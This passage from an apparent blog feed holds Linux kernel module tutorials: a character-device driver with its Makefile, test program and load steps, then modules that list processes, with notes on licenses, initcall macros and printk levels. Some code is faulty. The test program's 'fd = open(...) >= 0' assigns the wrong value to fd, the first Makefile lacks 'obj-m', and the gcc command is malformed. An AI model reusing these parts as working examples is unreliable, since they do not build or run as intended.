class="keyword">if</span> ((filp-&gt;f_pos + offset) &gt; MYDEV_SIZE || (filp-&gt;f_pos + offset) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ret = -EINVAL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filp-&gt;f_pos += offset;</span><br><span class="line">            ret = filp-&gt;f_pos;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">mydev_ioctl</span><span class="params">(<span class="keyword">struct</span> file * filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mydev_dev</span> * <span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, MYDEV_SIZE);</span><br><span class="line">            printk(KERN_INFO <span class="string">&quot;mydev is set to zero\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// open function</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mydev_open</span><span class="params">(<span class="keyword">struct</span> inode * inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">    filp-&gt;private_data = mydev_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// release function</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mydev_release</span><span class="params">(<span class="keyword">struct</span> inode * inode, <span class="keyword">struct</span> file * filp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the character structure method</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">mydev_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .llseek = mydev_llseek,</span><br><span class="line">    .read = mydev_read,</span><br><span class="line">    .write = mydev_write,</span><br><span class="line">    .unlocked_ioctl = mydev_ioctl,</span><br><span class="line">    .open = mydev_open,</span><br><span class="line">    .release = mydev_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Character device setup functions</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">mydev_setup_cdev</span><span class="params">(<span class="keyword">struct</span> mydev_dev * dev, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="type">int</span> err, devno = MKDEV(mydev_major, index);  <span class="comment">// Get the device structure dev_t</span></span><br><span class="line">    </span><br><span class="line">    cdev_init(&amp;dev-&gt;cdev, &amp;mydev_fops);  <span class="comment">// Initialization of character devices and character device handling methods</span></span><br><span class="line">    dev-&gt;cdev.owner = THIS_MODULE;  <span class="comment">// Initialize the module to which the character device belongs</span></span><br><span class="line">    err = cdev_add(&amp;dev-&gt;cdev, devno, <span class="number">1</span>);  <span class="comment">// Add a character device</span></span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        printk(KERN_NOTICE <span class="string">&quot;Error %d adding mydev%d&quot;</span>, err, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Module initialization</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mydev_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = MKDEV(mydev_major, <span class="number">0</span>);  <span class="comment">// Get the character device structure</span></span><br><span class="line">    <span class="keyword">if</span> (mydev_major) &#123;</span><br><span class="line">        ret = register_chrdev_region(devno, <span class="number">1</span>, <span class="string">&quot;mydev&quot;</span>);  <span class="comment">// Register this cdev device, the second parameter is the number</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = alloc_chrdev_region(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;mydev&quot;</span>);  <span class="comment">// Request character device cdev space, the second parameter is the base, the third is the number</span></span><br><span class="line">        mydev_major = MAJOR(devno);  <span class="comment">// Get the major device number</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    mydev_devp = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mydev_dev), GFP_KERNEL);  <span class="comment">// Allocate mydev structure internal memory</span></span><br><span class="line">    <span class="keyword">if</span> (!mydev_devp) &#123;</span><br><span class="line">        ret = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> fail_malloc;    <span class="comment">//Jump if assignment fails</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// The differenct between major and minor equipment</span></span><br><span class="line">    mydev_setup_cdev(mydev_devp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">fail_malloc:</span><br><span class="line">    unregister_chrdev_region(devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mydev_init);</span><br><span class="line"><span class="comment">// Module uninstall function</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mydev_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    cdev_del(&amp;mydev_devp-&gt;cdev);</span><br><span class="line">    kfree(mydev_devp);</span><br><span class="line">    unregister_chrdev_region(MKDEV(mydev_major, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_exit(mydev_exit);</span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;AC&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL v2&quot;</span>);</span><br></pre></td></tr></table></figure><p>The Makefile program is as follows:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mydev.o</span><br><span class="line"></span><br><span class="line">KDIR := /home/test/test_kernel/linux-5.3.2</span><br><span class="line">PWD :=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure><h1 id="Character-device-validation"><a href="#Character-device-validation" class="headerlink" title="Character device validation"></a>Character device validation</h1><ul><li>Enter the make command in the mydev directory</li><li>First <code>dmesg -c</code></li><li>Then insert the module as administrator and type insmod mydev.ko in the mydev directory</li><li><code>cat /proc/devices</code> </li><li>Enter characters into this character device to create a device node: mknod &#x2F;dev&#x2F;mydev c 230 0 &#x2F;&#x2F;230 0 is the primary and secondary device number of the device you created; write the string: echo “hello world!”&gt;&#x2F;dev&#x2F;mydev; check the input information: cat &#x2F;dev&#x2F;mydev; check the read&#x2F;write situation: dmesg mydev</li></ul><h1 id="Test-Code"><a href="#Test-Code" class="headerlink" title="Test Code"></a>Test Code</h1><p>Create the mydevTest.c test file with the following code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">char</span> s[] = <span class="string">&quot;OvO\nTest,TeSt,Te5t,tesTte5T,tesT\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">80</span>];</span><br><span class="line"><span class="type">int</span> fd=open(<span class="string">&quot;/dev/mydev&quot;</span>, O_RDWR);  <span class="comment">//  Open mydev device, fd returns a number greater than 2 then success, O_RDWR for permission to give</span></span><br><span class="line"><span class="keyword">if</span> (fd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">write(fd, s, <span class="keyword">sizeof</span>(s));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---Write something to mydev---\n%d\n%s\n&quot;</span>, fd, s);</span><br><span class="line">close(fd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd = %d, seems there are some error...\n&quot;</span>, fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fd = open(<span class="string">&quot;/dev/mydev&quot;</span>, O_RDWR) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">read(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---Read something from mydev---\n%d\n%s\n&quot;</span>, fd, buffer);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd = %d, seems there are some error...\n&quot;</span>, fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Type gcc mydevTest.c a.out to generate a.out, then type . &#x2F;a.out to run.</p></blockquote><p>mydev: loading out-of-tree module taints kernel.<br>mydev: module verification failed: signature and&#x2F;or required key missing - tainting kernel</p><p>are the very beginning of the Linux source code .config, which will be shown in this experiment but does not affect</p><p>If there is no CONFIG_MODULE_SIG&#x3D;n statement in the Makefile file, then the hello.txt file will show </p><p>module verification failed: signature and&#x2F;or required key missing - tainting kernel<br>i.e.: Module verification failed.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Linux Character Driver&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Programming Linux Modules</title>
    <link href="http://aslin.site/2022/03/09/Programming-Linux-Modules/"/>
    <id>http://aslin.site/2022/03/09/Programming-Linux-Modules/</id>
    <published>2022-03-09T05:10:34.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>Kernel Module</p><span id="more"></span><h2 id="Implemented-modules"><a href="#Implemented-modules" class="headerlink" title="Implemented modules"></a>Implemented modules</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//select_and_show.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">module_param(pid, uint, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">select_and_show_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">p</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">children</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">sibling</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> * <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line">printk(<span class="string">&quot;Begin\n&quot;</span>);</span><br><span class="line">printk(<span class="string">&quot;Relationship\tName                \tPID   \tStat  \tPrio  \n&quot;</span>);</span><br><span class="line">p = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br><span class="line">printk(<span class="string">&quot;Self        \t%-20s\t%-6d\t%-6ld\t%-6d\n&quot;</span>, p-&gt;comm, p-&gt;pid, p-&gt;state, p-&gt;prio);</span><br><span class="line"></span><br><span class="line">parent = p-&gt;parent;</span><br><span class="line">printk(<span class="string">&quot;Parent      \t%-20s\t%-6d\t%-6ld\t%-6d\n&quot;</span>, parent-&gt;comm, parent-&gt;pid, parent-&gt;state, parent-&gt;prio); </span><br><span class="line">    </span><br><span class="line"><span class="built_in">list</span> = &amp;parent-&gt;children;</span><br><span class="line">list_for_each(<span class="built_in">list</span>, &amp;parent-&gt;children) &#123;</span><br><span class="line">sibling = list_entry(<span class="built_in">list</span>, <span class="keyword">struct</span> task_struct, sibling);</span><br><span class="line">printk(<span class="string">&quot;Brother     \t%-20s\t%-6d\t%-6ld\t%-6d\n&quot;</span>, sibling-&gt;comm, sibling-&gt;pid, sibling-&gt;state, sibling-&gt;prio); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = &amp;p-&gt;children;</span><br><span class="line">list_for_each(<span class="built_in">list</span>, &amp;p-&gt;children) &#123;</span><br><span class="line">children = list_entry(<span class="built_in">list</span>, <span class="keyword">struct</span> task_struct, sibling);</span><br><span class="line">printk(<span class="string">&quot;Children    \t%-20s\t%-6d\t%-6ld\t%-6d\n&quot;</span>, children-&gt;comm, children-&gt;pid, children-&gt;state, children-&gt;prio);     </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">select_and_show_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_ALERT<span class="string">&quot;goodbye~\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(select_and_show_init);</span><br><span class="line">module_exit(select_and_show_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show_all.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init_task.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">show_all_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">p = &amp;init_task;</span><br><span class="line">printk(KERN_ALERT<span class="string">&quot;Name                \tPid\tStat\tPrio\tParent\t&quot;</span>);</span><br><span class="line">for_each_process(p) &#123;</span><br><span class="line">printk(KERN_ALERT<span class="string">&quot;%-20s\t%d\t%ld\t%d\t%d\n&quot;</span>, p-&gt;comm, p-&gt;pid, p-&gt;state, p-&gt;prio, p-&gt;parent-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">show_all_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">printk(KERN_ALERT<span class="string">&quot;goodbye~\n&quot;</span>);  <span class="comment">//KERN_ALERT</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(show_all_init);</span><br><span class="line">module_exit(show_all_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m := show_all.o</span><br><span class="line"><span class="section">show_all-objs:=lab2_1.o</span></span><br><span class="line">KDIR := /home/test/test_kernel/linux-5.3.2</span><br><span class="line">PWD :=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure><h2 id="Related-Source-Code"><a href="#Related-Source-Code" class="headerlink" title="Related Source Code"></a>Related Source Code</h2><h3 id="License-statement-for-modules"><a href="#License-statement-for-modules" class="headerlink" title="License statement for modules"></a>License statement for modules</h3><p><code>MODULE_LICENSE(&quot;GPL&quot;);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MODULE_LICENSE(_license)   <span class="comment">// _license is the license name string</span></span><br><span class="line"><span class="comment">//&quot;GPL&quot;                         　　　[GNU Public License v2 or later]</span></span><br><span class="line"><span class="comment">//&quot;GPL v2&quot;                     　 　　[GNU Public License v2]</span></span><br><span class="line"><span class="comment">//&quot;GPL and additional rights&quot;　　　　 [GNU Public License v2 rights and more]</span></span><br><span class="line"><span class="comment">//&quot;Dual BSD/GPL&quot;                     [GNU Public License v2 or BSD license choice]</span></span><br><span class="line"><span class="comment">//&quot;Dual MIT/GPL&quot;                     [GNU Public License v2 or MIT license choice]</span></span><br><span class="line"><span class="comment">//&quot;Dual MPL/GPL&quot;                     [GNU Public License v2 or Mozilla license choice]</span></span><br></pre></td></tr></table></figure><p>From kernel version 2.4.10 on, modules must declare the license of this module via the MODULE_LICENSE macro, otherwise you will receive a warning that the kernel is contaminated with “kernel tainted” when loading this module. As we can see from the linux&#x2F;module.h file, the meaningful licenses accepted by the kernel are “GPL”, “GPL v2”, “GPL and additional rights”, “Dual BSD&#x2F;GPL”, “Dual MPL&#x2F;GPL”, “Proprietary “.</p><h3 id="module-init-TODO"><a href="#module-init-TODO" class="headerlink" title="module_init (TODO)"></a>module_init (TODO)</h3><p>Find the <code>include\linux\init.h</code> file in the kernel source code directory</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> module_init(x) __initcall(x);</span></span><br></pre></td></tr></table></figure><p>If this is a macro definition, then what is <code>__initcall(x)</code>?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __define_initcall(fn, id) \  </span></span><br><span class="line">    <span class="type">static</span> <span class="type">initcall_t</span> __initcall_#<span class="meta">#fn##id __used \  </span></span><br><span class="line">    __attribute__((__section__(<span class="string">&quot;.initcall&quot;</span> <span class="meta">#id <span class="string">&quot;.init&quot;</span>))) = fn</span></span><br></pre></td></tr></table></figure><p><strong>initcalls</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> pure_initcall(fn)       __define_initcall(fn, 0)  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> core_initcall(fn)       __define_initcall(fn, 1)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> core_initcall_sync(fn)      __define_initcall(fn, 1s)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> postcore_initcall(fn)       __define_initcall(fn, 2)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> postcore_initcall_sync(fn)  __define_initcall(fn, 2s)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arch_initcall(fn)       __define_initcall(fn, 3)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arch_initcall_sync(fn)      __define_initcall(fn, 3s)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> subsys_initcall(fn)     __define_initcall(fn, 4)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> subsys_initcall_sync(fn)    __define_initcall(fn, 4s)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fs_initcall(fn)         __define_initcall(fn, 5)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fs_initcall_sync(fn)        __define_initcall(fn, 5s)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rootfs_initcall(fn)     __define_initcall(fn, rootfs)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> device_initcall(fn)     __define_initcall(fn, 6)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> device_initcall_sync(fn)    __define_initcall(fn, 6s)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> late_initcall(fn)       __define_initcall(fn, 7)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> late_initcall_sync(fn)      __define_initcall(fn, 7s)  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __initcall(fn) device_initcall(fn)  </span></span><br></pre></td></tr></table></figure><p>We can see very many <code>xxx_initcall</code> macro function definitions, they are all implemented by <code>__define_initcall</code>. Inside <code>__define_initcall</code> there are two parameters, one is fn and the other is id.</p><p>The function <code>do_initcalls</code> can be found in the <code>init\main.c</code> file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init <span class="title function_">do_initcalls</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">int</span> level;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (level = <span class="number">0</span>; level &lt; ARRAY_SIZE(initcall_levels) - <span class="number">1</span>; level++)  </span><br><span class="line">        do_initcall_level(level);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>do_initcalls</code> seems to be mainly a for loop, which is executing some functions by <code>level</code>.</p><p>So the question arises, what is <code>level</code> and what function is executed, but this goes back to the above macro definition, first a simple wave of macro definition process</p><p><code>module_init(fn)---&gt; __initcall(fn) ---&gt; device_initcall(fn) ---&gt; __define_initcall(fn, 6)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __define_initcall(fn, id) \  </span></span><br><span class="line">    <span class="type">static</span> <span class="type">initcall_t</span> __initcall_#<span class="meta">#fn##id __used \  </span></span><br><span class="line">    __attribute__((__section__(<span class="string">&quot;.initcall&quot;</span> <span class="meta">#id <span class="string">&quot;.init&quot;</span>))) = fn  </span></span><br></pre></td></tr></table></figure><p>In the macro definition above, <code>##</code> can mean a connection, and <code>__initcall_##fn##id </code> is <code>__initcall_fnid</code></p><p>When <code>fn</code> is <code>helloworld</code> and <code>id</code> is <code>4</code>, <code>__initcall_##fn##id</code> is <code>__initcall_helloworld4</code></p><p>A single <code>#</code> symbol can be stringified, and <code>#id</code> for <code>&quot;id&quot;</code></p><p>TODO…</p><hr><h3 id="Parameters-of-printk"><a href="#Parameters-of-printk" class="headerlink" title="Parameters of printk"></a>Parameters of printk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Emergency event message, prompted before a system crash, indicating that the system is unavailable</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_EMERG 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Report message that immediate action must be taken</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_ALERT 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Critical conditions, usually involving severe hardware or software operational failures</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_CRIT 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Error conditions, drivers often use KERN_ERR to report hardware errors</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_ERR 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Warning conditions for possible problem situations</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_WARNING 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Normal but important conditions for reminding</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_NOTICE 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 